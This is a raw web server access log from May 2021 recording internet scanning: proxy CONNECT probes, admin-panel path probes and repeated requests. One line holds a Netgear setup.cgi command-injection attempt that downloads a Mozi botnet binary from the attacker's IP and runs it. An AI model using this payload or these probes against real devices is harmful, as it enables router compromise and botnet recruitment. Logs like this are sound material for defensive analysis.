209.17.96.194 - - [06/May/2021:00:02:50 +0000] "GET / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:00:11:49 +0000] "CONNECT entropy.club:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:00:25:40 +0000] "CONNECT tsm.gg:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:00:26:57 +0000] "CONNECT health.gov:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:00:35:33 +0000] "CONNECT luna.gg:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:00:43:04 +0000] "CONNECT fazeclan.com:443 HTTP/1.1" 400 -
202.164.138.71 - - [06/May/2021:00:43:48 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://202.164.138.71:36241/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1083
167.71.102.181 - - [06/May/2021:00:44:46 +0000] "-" 400 -
161.129.155.154 - - [06/May/2021:00:46:45 +0000] "CONNECT www.popeyes.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:00:49:09 +0000] "CONNECT hwidspoofer.com:443 HTTP/1.1" 400 -
70.37.87.13 - - [06/May/2021:00:50:41 +0000] "GET /nifi/ HTTP/1.1" 404 1083
109.74.15.197 - - [06/May/2021:01:06:25 +0000] "GET /%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66%69%63%65%73%65%72%76%6C%65%74 HTTP/1.1" 404 1148
109.74.15.197 - - [06/May/2021:01:06:26 +0000] "GET /secure/ContactAdministrators!default.jspa HTTP/1.1" 404 1119
109.74.15.197 - - [06/May/2021:01:06:26 +0000] "GET /weaver/bsh.servlet.BshServlet HTTP/1.1" 404 1107
109.74.15.197 - - [06/May/2021:01:06:26 +0000] "GET /solr/ HTTP/1.1" 404 1083
109.74.15.197 - - [06/May/2021:01:06:26 +0000] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 1109
109.74.15.197 - - [06/May/2021:01:06:26 +0000] "GET /manager/html HTTP/1.1" 403 3503
109.74.15.197 - - [06/May/2021:01:06:27 +0000] "POST /axis2/axis2-admin/login HTTP/1.1" 404 1105
109.74.15.197 - - [06/May/2021:01:06:27 +0000] "GET /login HTTP/1.1" 404 1079
109.74.15.197 - - [06/May/2021:01:06:27 +0000] "GET /jenkins/login HTTP/1.1" 404 1091
161.129.155.154 - - [06/May/2021:01:07:29 +0000] "CONNECT phoenixstress.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:01:07:57 +0000] "CONNECT phoenixstress.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:01:08:03 +0000] "CONNECT phoenixstress.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:01:10:35 +0000] "CONNECT phoenixstress.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:01:11:17 +0000] "CONNECT phoenixstress.com:443 HTTP/1.1" 400 -
206.166.251.147 - - [06/May/2021:01:13:48 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:01:15:37 +0000] "CONNECT phoenixstress.com:443 HTTP/1.1" 400 -
198.98.54.148 - - [06/May/2021:01:29:06 +0000] "GET /manager/html HTTP/1.1" 403 3503
185.234.217.194 - - [06/May/2021:01:37:28 +0000] "GET / HTTP/1.1" 200 1
206.166.251.147 - - [06/May/2021:01:48:49 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:01:49:33 +0000] "POST / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:33 +0000] "GET // HTTP/1.1" 200 1
